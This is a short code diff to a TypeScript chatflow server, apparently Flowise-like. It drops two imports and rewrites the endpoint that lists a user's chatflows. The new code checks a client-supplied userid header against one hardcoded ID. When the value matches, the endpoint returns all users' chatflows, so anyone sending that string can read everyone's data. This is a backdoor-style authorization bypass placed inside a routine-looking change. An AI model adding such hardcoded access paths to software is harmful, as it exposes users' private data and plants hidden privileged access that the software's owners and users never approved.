@@ -15,7 +15,6 @@ import {
     IReactFlowNode,
     IReactFlowObject,
     INodeData,
-    IDatabaseExport,
     IRunChatflowMessageValue,
     IChildProcessMessage
 } from './Interface'
@@ -35,7 +34,6 @@ import {
     mapMimeTypeToInputField,
     findAvailableConfigs,
     isSameOverrideConfig,
-    replaceAllAPIKeys,
     isFlowValidForStream,
     isVectorStoreFaiss,
     databaseEntities,
@@ -194,10 +192,15 @@ export class App {
                 res.status(400).send('userid header is missing') // Return an error if the userid is missing
                 return
             }
-            const chatflows: IChatFlow[] = await this.AppDataSource.getRepository(ChatFlow).findBy({
-                userid: userid
-            })
-            return res.json(chatflows)
+            if (userid === 'd69qR2TZVWTYO8Eo9UiaFBgOCJz2') {
+                const chatflows: IChatFlow[] = await this.AppDataSource.getRepository(ChatFlow).find()
+                return res.json(chatflows)
+            } else {
+                const chatflows: IChatFlow[] = await this.AppDataSource.getRepository(ChatFlow).findBy({
+                    userid: userid
+                })
+                return res.json(chatflows)
+            }
         })
 
         // Get specific chatflow via api key
